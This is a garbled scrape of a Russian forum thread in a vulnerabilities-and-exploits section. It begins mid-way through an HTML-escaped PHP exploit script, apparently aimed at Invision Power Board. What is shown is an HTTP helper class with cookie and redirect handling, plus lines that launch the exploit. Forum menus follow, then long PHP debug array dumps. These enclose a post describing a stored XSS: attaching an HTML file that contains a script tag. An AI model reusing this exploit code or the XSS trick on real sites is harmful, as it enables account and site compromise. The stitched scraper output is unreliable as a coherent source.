':'.$this-&gt;port; $this-&gt;path = substr&#40;$urlarr&#91;'path'&#93;,0,strrpos&#40;$urlarr&#91;'path'&#93;,'/'&#41;+1&#41;; if&#40;$this-&gt;port &gt; 65535&#41; die&#40;&quot;Error: Invalid port number&quot;&#41;; &#125; /** * If you call this function, * the script will extract all * 'Set-Cookie' headers values * and it will automatically add * them into the 'Cookie' header * for all next requests. * * @access public * @param integer code 1&#40;enabled&#41; 0&#40;disabled&#41; * @example $this-&gt;cookiejar&#40;0&#41; * @example $this-&gt;cookiejar&#40;1&#41; * */ function cookiejar&#40;$code&#41; &#123; if&#40;$code=='0'&#41; $this-&gt;cookiejar=FALSE; elseif&#40;$code=='1'&#41; $this-&gt;cookiejar=TRUE; &#125; /** * If you call this function, * the script will follow all * redirections sent by the server. * * @access public * @param integer code 1&#40;enabled&#41; 0&#40;disabled&#41; * @example $this-&gt;allowredirection&#40;0&#41; * @example $this-&gt;allowredirection&#40;1&#41; * */ function allowredirection&#40;$code&#41; &#123; if&#40;$code=='0'&#41; $this-&gt;allowredirection=FALSE; elseif&#40;$code=='1'&#41; $this-&gt;allowredirection=TRUE; &#125; /** * This function is called if * allowredirection&#40;&#41; is enabled. * You don't have to call it. * * @access private * @return string $this-&gt;get&#40;'http://'.$this-&gt;host.$this-&gt;path.$this-&gt;last_redirection&#41; * @return string $this-&gt;get&#40;$this-&gt;last_redirection&#41; * @return string $this-&gt;recv; * */ function getredirection&#40;&#41; &#123; if&#40;preg_match&#40;'/&#40;location|content-location|uri&#41;: &#40;.*&#41;/i',$this-&gt;getheader&#40;&#41;,$codearr&#41;&#41; &#123; $this-&gt;last_redirection = trim&#40;$codearr&#91;2&#93;&#41;; if&#40;!ereg&#40;'://',$this-&gt;last_redirection&#41;&#41; return $this-&gt;get&#40;'http://'.$this-&gt;host.$this-&gt;path.$this-&gt;last_redirection&#41;; else return $this-&gt;get&#40;$this-&gt;last_redirection&#41;; &#125; else return $this-&gt;recv; &#125; /** * This function allows you * to reset some parameters. * * @access public * @param string func Param * @example $this-&gt;reset&#40;'header'&#41; * @example $this-&gt;reset&#40;'cookie'&#41; * @example $this-&gt;reset&#40;&#41; * */ function reset&#40;$func=''&#41; &#123; switch&#40;$func&#41; &#123; case 'header': $this-&gt;header = array&#40;&#41;; break; case 'cookie': $this-&gt;cookie = array&#40;&#41;; break; default: $this-&gt;cookiejar = ''; $this-&gt;header = array&#40;&#41;; $this-&gt;cookie = array&#40;&#41;; $this-&gt;allowredirection = ''; break; &#125; &#125; &#125; $web = new phpsploit; $web-&gt;cookiejar&#40;1&#41;; $web-&gt;agent&#40;'Mozilla Firefox'&#41;; $ipb = new ipb_spl; $ipb-&gt;web =&amp; $web; $ipb-&gt;main&#40;&#41;; ?&gt; ||divir|unknown_user|Откуда:|127.0.0.1|Сообщения:|691||Вернуться к началу||След.|Показать сообщения за: |Все сообщения|1 день|7 дней|2 недели|1 месяц|3 месяца|6 месяцев|1 год|Поле сортировки |Автор|Время размещения|Заголовок||по возрастанию|по убыванию||Ответить||Сообщений: 12 &bull; |Страница 1 из 2|&bull; |1|, |2||﻿Похожие темы|Ответы|Просмотры|Последнее сообщение|3 года в эфире. День рождения МегаОбзора и Полезного форума||1|, |2|, |3|, |4||V.A.N.O.|в форуме |Работа Mega Obzor и Полезного форума|37|7310||alexys|24 фев 2009 12:32 |Красивый блок навигации для форума или портала на phpBB3||PATAP|в форуме |Создание сайтов от А до Я|2|208||PATAP|11 дек 2011 23:03 |Созданы разделы для мужской и женской части форума||1|, |2|, |3||Lenar|в форуме |Работа Mega Obzor и Полезного форума|20|4833||Marvin|31 окт 2008 03:41 |Поиск неточностей и ошибок в новом дизайне форума||1|, |2|, |3|, |4||Lenar|в форуме |Работа Mega Obzor и Полезного форума|33|7181||Lenar|13 фев 2009 13:24 |7-8 апреля будет проходит редизайн форума||Lenar|в форуме |Работа Mega Obzor и Полезного форума|6|1389||Lenar|10 апр 2009 01:28 |Вернуться в Уязвимости и эксплойты||Перейти:|Выберите форум|------------------|Софт|Мир софта|Интернет и сети|Мультимедия|Графические программы|Система|Офис и дисковые утилиты|WebTeam SMM|Уязвимости и эксплойты|Вирусная лаборатория и Безопасность|Железо и Гаджеты|Компьютерное железо|Сист.блоки|Матер.платы|Блоки питания|Видеокарты|Процессоры|Опер.память|Охлажд.системы|Накопители|Ноутбуки|Вопросы по операционным системам|Linux|MacOS|Windows 7|Мобильные телефоны|Pocket PC|Творчество|Компьютерная графика и фотография.|Фотосеты мужчин и женщин|Искусство фотографии|Уроки Photoshop. Авторские уроки фотошоп. Конкурс уроки фотошопа|Полезности Photoshop|Работы Photoshop|Аватары|Обои|Дизайн и раскрутка|Создание сайтов от А до Я|Всемирная паутина|Развлечения|Игры|Мир WarCraft|ММПОРГ|Экшен|Симуляторы и Спортивные|Стратегии и RPG|Квесты|Читы к играм|Кино и телевидение|Легенды нашего кино|Сериалы|Мультфильмы|ТВ программы|Саундтреки к фильмам (film soundtrack)|Сумерки|Музыка и литература|Исполнители|Писатели|Вокруг света|Life|Спорт и Здоровье|Хоккей|Футбол|Факты о здоровье|Автомобили|Авто хиты|Автоспорт|Авто новости|Жизнь|Быт|Дети|Финансы|Политика|Катастрофы|Образование|Программирование|Кулинарная книга|Напитки|Живность|Домашние растения|Отношения|Отношения между любимыми|Психология|Секс|Контрацепция, беременность, роды|Интересные факты, мифы|Физиология, анатомия|Общее|Работа Mega Obzor и Полезного форума|Специальная тема|Конкурсы|Беседка|Юмор|Таблетки от жадности|Корзина||Кто сейчас на сайте|Сейчас этот форум просматривают: нет зарегистрированных пользователей и гости: 1||Список форумов|Удалить cookies конференции|&bull; Часовой пояс: UTC + 4 часа ||﻿2006-2012 MegaObzor. © SMM CMS, phpbbex (Свид-во гос.регистрации программы для ЭВМ №2009611099). Все размещенные материалы являются интеллектуальной собственностью их Авторов. Копирование материалов только с указанием прямой ссылки на |Mega Obzor.com|&copy;||0|Lenar//29HHHHUNDO=0|Array
(
    [0] => Array
        (
            [0] => Array
                (
                    [0] =>  18 июн 2007 01:52 
                    [1] => 1016
                )

            [1] => Array
                (
                    [0] =>  29 фев 2008 19:11 
                    [1] => 8151
                )

            [2] => Array
                (
                    [0] =>  29 фев 2008 19:13 
                    [1] => 12953
                )

            [3] => Array
                (
                    [0] =>  29 фев 2008 19:16 
                    [1] => 13138
                )

            [4] => Array
                (
                    [0] =>  02 мар 2008 17:38 
                    [1] => 15790
                )

            [5] => Array
                (
                    [0] =>  26 апр 2008 14:20 
                    [1] => 33238
                )

            [6] => Array
                (
                    [0] =>  13 июн 2008 21:18 
                    [1] => 47318
                )

            [7] => Array
                (
                    [0] =>  08 авг 2008 16:38 
                    [1] => 48043
                )

            [8] => Array
                (
                    [0] =>  02 сен 2008 20:11 
                    [1] => 51426
                )

            [9] => Array
                (
                    [0] =>  03 сен 2008 15:05 
                    [1] => 55180
                )

            [10] => Array
                (
                    [0] => |24 фев 2009 12:32 
                    [1] => 102574
                )

            [11] => Array
                (
                    [0] => |11 дек 2011 23:03 
                    [1] => 102778
                )

            [12] => Array
                (
                    [0] => |31 окт 2008 03:41 
                    [1] => 103006
                )

            [13] => Array
                (
                    [0] => |13 фев 2009 13:24 
                    [1] => 103236
                )

            [14] => Array
                (
                    [0] => |10 апр 2009 01:28 
                    [1] => 103430
                )

        )

    [time] => Array
        (
            [0] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [1] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [2] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [3] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [4] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [5] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [6] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [7] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [8] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [9] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [10] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [11] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [12] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [13] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [14] => Array
                (
                    [0] => 
                    [1] => -1
                )

        )

    [1] => Array
        (
            [0] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [1] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [2] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [3] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [4] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [5] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [6] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [7] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [8] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [9] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [10] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [11] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [12] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [13] => Array
                (
                    [0] => 
                    [1] => -1
                )

            [14] => Array
                (
                    [0] => 
                    [1] => -1
                )

        )

    [time1] => Array
        (
            [0] => Array
                (
                    [0] =>  18 июн 2007 01:52 
                    [1] => 1016
                )

            [1] => Array
                (
                    [0] =>  29 фев 2008 19:11 
                    [1] => 8151
                )

            [2] => Array
                (
                    [0] =>  29 фев 2008 19:13 
                    [1] => 12953
                )

            [3] => Array
                (
                    [0] =>  29 фев 2008 19:16 
                    [1] => 13138
                )

            [4] => Array
                (
                    [0] =>  02 мар 2008 17:38 
                    [1] => 15790
                )

            [5] => Array
                (
                    [0] =>  26 апр 2008 14:20 
                    [1] => 33238
                )

            [6] => Array
                (
                    [0] =>  13 июн 2008 21:18 
                    [1] => 47318
                )

            [7] => Array
                (
                    [0] =>  08 авг 2008 16:38 
                    [1] => 48043
                )

            [8] => Array
                (
                    [0] =>  02 сен 2008 20:11 
                    [1] => 51426
                )

            [9] => Array
                (
                    [0] =>  03 сен 2008 15:05 
                    [1] => 55180
                )

            [10] => Array
                (
                    [0] => |24 фев 2009 12:32 
                    [1] => 102574
                )

            [11] => Array
                (
                    [0] => |11 дек 2011 23:03 
                    [1] => 102778
                )

            [12] => Array
                (
                    [0] => |31 окт 2008 03:41 
                    [1] => 103006
                )

            [13] => Array
                (
                    [0] => |13 фев 2009 13:24 
                    [1] => 103236
                )

            [14] => Array
                (
                    [0] => |10 апр 2009 01:28 
                    [1] => 103430
                )

        )

    [2] => Array
        (
            [0] => Array
                (
                    [0] =>  18 июн 2007 01:52 
                    [1] => 1016
                )

            [1] => Array
                (
                    [0] =>  29 фев 2008 19:11 
                    [1] => 8151
                )

            [2] => Array
                (
                    [0] =>  29 фев 2008 19:13 
                    [1] => 12953
                )

            [3] => Array
                (
                    [0] =>  29 фев 2008 19:16 
                    [1] => 13138
                )

            [4] => Array
                (
                    [0] =>  02 мар 2008 17:38 
                    [1] => 15790
                )

            [5] => Array
                (
                    [0] =>  26 апр 2008 14:20 
                    [1] => 33238
                )

            [6] => Array
                (
                    [0] =>  13 июн 2008 21:18 
                    [1] => 47318
                )

            [7] => Array
                (
                    [0] =>  08 авг 2008 16:38 
                    [1] => 48043
                )

            [8] => Array
                (
                    [0] =>  02 сен 2008 20:11 
                    [1] => 51426
                )

            [9] => Array
                (
                    [0] =>  03 сен 2008 15:05 
                    [1] => 55180
                )

            [10] => Array
                (
                    [0] => |24 фев 2009 12:32 
                    [1] => 102574
                )

            [11] => Array
                (
                    [0] => |11 дек 2011 23:03 
                    [1] => 102778
                )

            [12] => Array
                (
                    [0] => |31 окт 2008 03:41 
                    [1] => 103006
                )

            [13] => Array
                (
                    [0] => |13 фев 2009 13:24 
                    [1] => 103236
                )

            [14] => Array
                (
                    [0] => |10 апр 2009 01:28 
                    [1] => 103430
                )

        )

    [3] => Array
        (
            [0] => Array
                (
                    [0] => 18
                    [1] => 1017
                )

            [1] => Array
                (
                    [0] => 29
                    [1] => 8152
                )

            [2] => Array
                (
                    [0] => 29
                    [1] => 12954
                )

            [3] => Array
                (
                    [0] => 29
                    [1] => 13139
                )

            [4] => Array
                (
                    [0] => 02
                    [1] => 15791
                )

            [5] => Array
                (
                    [0] => 26
                    [1] => 33239
                )

            [6] => Array
                (
                    [0] => 13
                    [1] => 47319
                )

            [7] => Array
                (
                    [0] => 08
                    [1] => 48044
                )

            [8] => Array
                (
                    [0] => 02
                    [1] => 51427
                )

            [9] => Array
                (
                    [0] => 03
                    [1] => 55181
                )

            [10] => Array
                (
                    [0] => 24
                    [1] => 102575
                )

            [11] => Array
                (
                    [0] => 11
                    [1] => 102779
                )

            [12] => Array
                (
                    [0] => 31
                    [1] => 103007
                )

            [13] => Array
                (
                    [0] => 13
                    [1] => 103237
                )

            [14] => Array
                (
                    [0] => 10
                    [1] => 103431
                )

        )

    [4] => Array
        (
            [0] => 
            [1] => 
            [2] => 
            [3] => 
            [4] => 
            [5] => 
            [6] => 
            [7] => 
            [8] => 
            [9] => 
            [10] => 
            [11] => 
            [12] => 
            [13] => 
            [14] => 
        )

)
Array
(
    [post] => Array
        (
            [0] => 1016
            [1] => 8151
            [2] => 12953
            [3] => 13138
            [4] => 15790
            [5] => 33238
            [6] => 47318
            [7] => 48043
            [8] => 51426
            [9] => 55180
            [10] => 102574
            [11] => 102778
            [12] => 103006
            [13] => 103236
            [14] => 103430
        )

    [time] => Array
        (
            [0] =>  18 июн 2007 01:52 
            [1] =>  29 фев 2008 19:11 
            [2] =>  29 фев 2008 19:13 
            [3] =>  29 фев 2008 19:16 
            [4] =>  02 мар 2008 17:38 
            [5] =>  26 апр 2008 14:20 
            [6] =>  13 июн 2008 21:18 
            [7] =>  08 авг 2008 16:38 
            [8] =>  02 сен 2008 20:11 
            [9] =>  03 сен 2008 15:05 
            [10] => |24 фев 2009 12:32 
            [11] => |11 дек 2011 23:03 
            [12] => |31 окт 2008 03:41 
            [13] => |13 фев 2009 13:24 
            [14] => |10 апр 2009 01:28 
        )

)
Array
(
    [0] => Array
        (
            [0] => Работает в ie Не работает в opera 1) создаем файл any.html внути него &lt;script&gt;alert()&lt;/script&gt; 2) содаем пост с аттачем any.html
            [1] => 47385
        )

)
47385 103430 0Array
(
    [cont] => Array
        (
            [0] => Работает в ie Не работает в opera 1) создаем файл any.html внути него &lt;script&gt;alert()&lt;/script&gt; 2) содаем пост с аттачем any.html
        )

    [time] => Array
        (
            [0] =>  08 авг 2008 16:38 
        )

)
